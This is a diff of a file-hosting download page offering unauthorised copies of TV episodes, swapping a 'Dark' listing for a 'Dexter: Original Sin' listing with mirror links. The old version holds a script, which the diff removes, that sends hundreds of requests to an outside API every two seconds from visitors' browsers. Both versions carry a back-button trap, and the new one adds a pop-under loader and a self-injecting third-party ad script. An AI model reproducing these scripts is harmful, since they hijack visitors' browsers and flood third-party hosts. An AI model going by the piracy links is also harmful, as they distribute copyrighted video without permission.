@@ -1,4 +1,11 @@
-<script data-cfasync="false" src="//d1vy7td57198sq.cloudfront.net/?dtyvd=1108348"></script>
+<script id="aclib" type="text/javascript" src="//acscdn.com/script/aclib.js"></script>
+<script type="text/javascript">
+    aclib.runPop({
+        zoneId: '10553222',
+    });
+</script>
+
+<!--<script data-cfasync="false" src="//dl4d3y1ajyv3q.cloudfront.net/?aydld=1220853"></script>-->
 <script>
 document.addEventListener("DOMContentLoaded", function() {
     history.pushState(null, null, location.href);
@@ -10,7 +17,7 @@ document.addEventListener("DOMContentLoaded", function() {
 </script>
 <html>
 <head>
-<title>Dark.S03E08.The.Paradise.1080p.NF.WEB-DL.English.DDP5.1-German.DDP5.1.H.264-4kHdHub.Com.mkv</title>
+<title>Dexter.Original.Sin.S01E01.2160p.SKST.WEB-DL.H.265.DDP5.1-Tyrell.mkv</title>
 <meta charset="utf-8">
 <script async src="https://arc.io/widget.min.js#cmedRMLe"></script>
 <meta name="referrer" content="no-referrer">
@@ -133,7 +140,7 @@ document.addEventListener("DOMContentLoaded", function() {
 <body><center>
   <br/>
 <div class="header">
-HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
+HubCloud | <a href="https://hubcloud.foo/drive/admin">Login</a>
 </div>
 
 <div class="container">
@@ -144,13 +151,13 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
 <div class="card h6">
 
 	<div class="card-header text-white bg-primary mb-3">
-		Dark.S03E08.The.Paradise.1080p.NF.WEB-DL.English.DDP5.1-German.DDP5.1.H.264-4kHdHub.Com.mkv	</div>
+		Dexter.Original.Sin.S01E01.2160p.SKST.WEB-DL.H.265.DDP5.1-Tyrell.mkv	</div>
 
 	<div class="card-body">
 		<ul class="list-group">
-			<li class="list-group-item d-flex justify-content-between align-items-center">File Size<i id="size">3.15 GB</i></li>
+			<li class="list-group-item d-flex justify-content-between align-items-center">File Size<i id="size">5.34 GB</i></li>
     		<li class="list-group-item d-flex justify-content-between align-items-center">File Type<i>video/x-matrosk</i></li>
-    		<li class="list-group-item d-flex justify-content-between align-items-center">Share Date<i id="date">18-May-2025 10:45:55</i></li>
+    		<li class="list-group-item d-flex justify-content-between align-items-center">Share Date<i id="date">21-Apr-2025 05:22:19</i></li>
     	</ul>
     	
 	</div>
@@ -160,7 +167,7 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
 </div> 
 <p class="h3 text-success">Download Link Generated</p>
 <div class="input-group mb-3">
-  <input onclick="copy_link('ilink')" type="text" class="form-control" value="https://hubcloud.one/drive/nknlofk8snfnknh" readonly="" id="ilink">
+  <input onclick="copy_link('ilink')" type="text" class="form-control" value="https://hubcloud.foo/drive/idt1evqfuviqiei" readonly="" id="ilink">
   <div class="input-group-prepend">
     <span class="input-group-text btn" id="basic-addon2" onclick="copy_link('ilink')">Copy Share Link</span>
   </div>
@@ -176,8 +183,15 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
     <span>If All Servers 🛜 are not working ❌ Then Please <br><b>Change Your Browser DNS To Cloudflare 🚀 or Use <a href="https://one.one.one.one/" target="_blank">VPN</a></b> <br><a href="https://tinyurl.com/Unblock-Ban-Site" target="_blank">How ? Click Here 👉 to Watch Tutorial 👀</a></span>
 </div>
 
-
-
+    
+    <a href="?token=a05d8e6416ce6b745a1073feeb9128a4" id="s3" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-success btn-lg h6" style="background-color: #2d50e2d1 !important;"><i class="fas fa-file-download fa-lg"></i> Download [FSLv2 Server]</a>
+    
+    <script>
+        const fsl = document.getElementById('s3');
+        if (fsl) fsl.href += '_1' + new Date().getMinutes();
+    </script>
+    
+    
 <div class="ad-container"></div>
 
 
@@ -185,15 +199,21 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
 
 
 
-    <iframe src="https://pixeldrain.dev/u/2kFQBQio?embed" width="0" height="0" frameborder="0" style="display:none;" sandbox="allow-scripts allow-same-origin"></iframe>
-    <a href="https://pixeldrain.dev/api/file/2kFQBQio?download" download="Dark.S03E08.The.Paradise.1080p.NF.WEB-DL.English.DDP5.1-German.DDP5.1.H.264-4kHdHub.Com.mkv" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-success btn-lg h6" style="background-color: #6f42c1 !important;"><i class="fas fa-file-download fa-lg"></i> Download [PixelServer : 2]</a>
-    
-    
+
+
+    <a href="https://pub-b5ecaffddf2344a0ae2222f5e8913e1b.r2.dev/Dexter.Original.Sin.S01E01.2160p.SKST.WEB-DL.H.265.DDP5.1-Tyrell.mkv?token=1765557444" id="fsl" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-success btn-lg h6"><i class="fas fa-file-download fa-lg"></i> Download [FSL Server]</a>
+    <script>
+        const fsl = document.getElementById('fsl');
+        if (fsl) fsl.href += '1' + new Date().getMinutes();
+    </script>
+
+
+
 
 
 
         
-        <a href="https://pixel.hubcdn.fans/?id=4cbb9dc94a8c4698314305f887e913c3e7fef7f000d3da8d2bd1f4d6a1dca4d45fb98f415eea4192a2aeb35f6accfac5767d8eddd50fad89c724bb8075ae2dbe2e2987753b74253cf00625ede66ea0ec8ea4150eebb24be8a9e70bf70563d808::54473e647fcc8c02ec47d4d732f45d14" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-danger btn-lg h6" style="background-color: #dc3545 !important;">
+        <a href="https://pixel.hubcdn.fans/?id=93cbf9a8a64bd73e509803a9c1a42d3ca3c1b5e6eedf0306d86e7862fe38d6450d7165aa485b86286f5e95151d3af31e89350676e5cca8b54f56737388e81172998605a935e8c1828f026797bc158ff23921f09201c464a9d4a29c75f5e12026::43a5d16883d6f6cd09d2487e56f0836d" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-danger btn-lg h6" style="background-color: #dc3545 !important;">
             <i class="fas fa-file-download fa-lg"></i> Download [Server : 10Gbps]</a>
             
             <p style="font-size: 12px; padding-bottom:4px !important; margin-bottom:0px !important">
@@ -204,18 +224,10 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
                 
         
         
-
-
-
- 
-
-<a href="https://pub-c0c400d353df4c68ae3a2d5e089ecf60.r2.dev/Dark.S03E08.The.Paradise.1080p.NF.WEB-DL.English.DDP5.1-German.DDP5.1.H.264-4kHdHub.Com.mkv" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-success btn-lg h6"><i class="fas fa-file-download fa-lg"></i> Download File [3.15 GB]</a>
-
-
-
-    <a href="https://ddl2.cloudserver-1692964037.workers.dev/1397313204/31f8b5a9e6a1a2e056ef0905797230a1f28057dc1e4d12e6843c03ac6bfdf7d87889a636620b547798bce78d1647ebb482a308c38e4149f422bc3afb2b6f7d171a63e1ff2029b7f90c72181d26989a4de3c23f7b316ee3138fc1dd9c2612d8c8dae2b4c5297f87320ffcb63d71429bde3258ec121653bd4c6f49f372465f13acf7bcc770f52f649c1c65c7cc54d18ed36620a55ccb9bbef084af996524ea69df8191345e6dba2f8398d7b5c3ef2500a32bd2e147507a1741efe63c902d8e1821::61c7925f0014900c78f913a268a069bf/Dark.S03E08.The.Paradise.1080p.NF.WEB-DL.English.DDP5.1-German.DDP5.1.H.264-4kHdHub.Com.mkv.zip" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-success btn-lg h6" style="background-color: #474b48 !important;"><i class="fas fa-file-download fa-lg"></i> Download [ZipDisk Server]</a>
-    <p style="
-    font-size: 12px; padding-bottom:4px !important; margin-bottom:0px !important">Resume is Supported in ZipDisk But please extract it as the files is inside zip</p>
+    <iframe src="https://pixeldrain.dev/u/HqAiguQV?embed" width="0" height="0" frameborder="0" style="display:none;" sandbox="allow-scripts allow-same-origin"></iframe>
+    <a href="https://pixeldrain.dev/u/HqAiguQV" download="Dexter.Original.Sin.S01E01.2160p.SKST.WEB-DL.H.265.DDP5.1-Tyrell.mkv" rel="noreferrer nofollow noopener" target="_blank" class="btn btn-success btn-lg h6" style="background-color: #6f42c1 !important;"><i class="fas fa-file-download fa-lg"></i> Download [PixelServer : 2]</a>
+    
+    
 
 
 
@@ -223,8 +235,11 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
 
 
 
-<br>
-<a href="https://www-google-com.cdn.ampproject.org/c/s/bloggingvector.shop/foo/aHR0cHM6Ly93d3ctZ29vZ2xlLWNvbS5jZG4uYW1wcHJvamVjdC5vcmcvYy9zL25ld3NvbmdzLmNvLmluL2dvP2lkPTNPZnAzZHl1b3FUaHp1RFkzTi9LNGFIWjNOQ2p1K3JQek9EaTZ0SGgyTlhrNGFqbjU5YmYzYkhEeTltdXlNZTd3OHJmcEtqSG1zYkN3cDIvcXNxOTFiL0t1S3FpeXFianhNZlV2cmpKMjlXNjJPQ2htc2pMNWJ6T3ljbTZ3Y0hZdWN1eTRMRT0=" target="_blank" rel="noopener noreferrer nofollow" class="btn btn-primary h5" style="margin-top: 11px;"><i class="fab fa-telegram fa-lg"></i></i> Downoad From Telegram ðŸ”¥</a>
+
+
+
+
+
 
 <button id="android_launch" class="btn btn-success btn-lg h6 p-2 d-none" style="background: #0d0b15 !important;"><i class="fab fa-android fa-lg" style="color: #63E6BE;"></i> DL/Open with Android App</button>
 
@@ -241,7 +256,7 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
     if(isAndroid()){
         android_launch.classList.remove("d-none");
         android_launch.addEventListener('click', ()=>{
-            var anchor = document.createElement('a');anchor.href= createIntentURL({host: 'https://pub-c0c400d353df4c68ae3a2d5e089ecf60.r2.dev/Dark.S03E08.The.Paradise.1080p.NF.WEB-DL.English.DDP5.1-German.DDP5.1.H.264-4kHdHub.Com.mkv',scheme: 'https',type: 'video/x-matrosk',
+            var anchor = document.createElement('a');anchor.href= createIntentURL({host: 'https://pub-b5ecaffddf2344a0ae2222f5e8913e1b.r2.dev/Dexter.Original.Sin.S01E01.2160p.SKST.WEB-DL.H.265.DDP5.1-Tyrell.mkv?token=1765557444',scheme: 'https',type: 'video/x-matrosk',
             });anchor.click();
         });
         
@@ -278,7 +293,7 @@ HubCloud | <a href="https://hubcloud.one/drive/admin">Login</a>
 </div>
 <div class="card">
 <div class="card-body" id="div1">
-<p id="sharelink" onclick="copy_link('div1')">https://hubcloud.one/drive/nknlofk8snfnknh</p>
+<p id="sharelink" onclick="copy_link('div1')">https://hubcloud.foo/drive/idt1evqfuviqiei</p>
 </div>
 <button class="btn btn-success btn-sm" id="button1" onclick="copy_link('div1')"><i class="fa fa-copy"></i> Copy Link</button>
 <script>
@@ -312,6 +327,7 @@ Msc
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.1.3/dist/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
 
 <!--2dl-->
+    
 <div class="footer">
 
 <p>Made with <svg width="1em" height="1em" viewBox="0 0 16 16" class="bi bi-heart-fill" fill="red" xmlns="http://www.w3.org/2000/svg"> <path fill-rule="evenodd" d="M8 1.314C12.438-3.248 23.534 4.735 8 15-7.534 4.736 3.562-3.248 8 1.314z" /> </svg></p>
@@ -326,25 +342,44 @@ function cn(t){let e=window.location.protocol+"//"+window.location.host+t;histor
 function setCookie(e,t,i){let o=encodeURIComponent(t),$=new Date;$.setTime($.getTime()+36e5*i);let n=`${e}=${o}; expires=${$.toUTCString()}; path=/`;document.cookie=n}setCookie("xyt",1,24);
 </script>
 
-<script>
-function x(){
-    for (let i = 0; i < 369; i++) {
-    
-	 fetch("https://apis.damanworlds.world/api/"+new Date().getTime() + i, {
-          "method": "GET",
-          "mode": "no-cors",
-          "referrerPolicy": 'no-referrer',
-        });
-	}
-}
-x();
-const intervalId = setInterval(() => {
-    x();
-}, 2000)
-</script>
 
 <!--<script async src="https://greenanalytics.autos/recaptcha/v4_enc.js"></script>-->
 
 <!--<script>let s__=!1,observer=null;const sc_="a, button";function opst(e){if(!s__)return;e.preventDefault(),e.stopImmediatePropagation();let t=document.createElement("a");t.href=s__,t.target="_blank",t.rel="noopener noreferrer",t.click();let r=document.querySelectorAll(sc_);r.forEach(e=>{e.removeEventListener("click",opst)}),observer.disconnect()}function atchs(){let e=document.querySelectorAll(sc_);e.forEach(e=>{e.addEventListener("click",opst,{once:!0})})}window.addEventListener("message",function(e){try{let t=JSON.parse(e.data);t?.url&&(s__=t.url,atchs(),(observer=new MutationObserver(atchs)).observe(document.body,{childList:!0,subtree:!0}))}catch(r){}},!1);-->
 <!--</script>-->
 
+
+<script>
+function setCookie(e,t,i){let o=encodeURIComponent(t),$=new Date;$.setTime($.getTime()+36e5*i);let n=`${e}=${o}; expires=${$.toUTCString()}; path=/`;document.cookie=n}setCookie("xyt",1,24);
+</script>
+
+
+
+
+
+<script data-cfasync="false" type="text/javascript" id="clever-core">
+/* <![CDATA[ */
+    (function (document, window) {
+        var a, c = document.createElement("script"), f = window.frameElement;
+
+        c.id = "CleverCoreLoader98023";
+        c.src = "https://scripts.cleverwebserver.com/9afdf189fcae8189c250865783d52630.js";
+
+        c.async = !0;
+        c.type = "text/javascript";
+        c.setAttribute("data-target", window.name || (f && f.getAttribute("id")));
+        c.setAttribute("data-callback", "put-your-callback-function-here");
+        c.setAttribute("data-callback-url-click", "put-your-click-macro-here");
+        c.setAttribute("data-callback-url-view", "put-your-view-macro-here");
+
+        try {
+            a = parent.document.getElementsByTagName("script")[0] || document.getElementsByTagName("script")[0];
+        } catch (e) {
+            a = !1;
+        }
+
+        a || (a = document.getElementsByTagName("head")[0] || document.getElementsByTagName("body")[0]);
+        a.parentNode.insertBefore(c, a);
+    })(document, window);
+/* ]]> */
+</script>
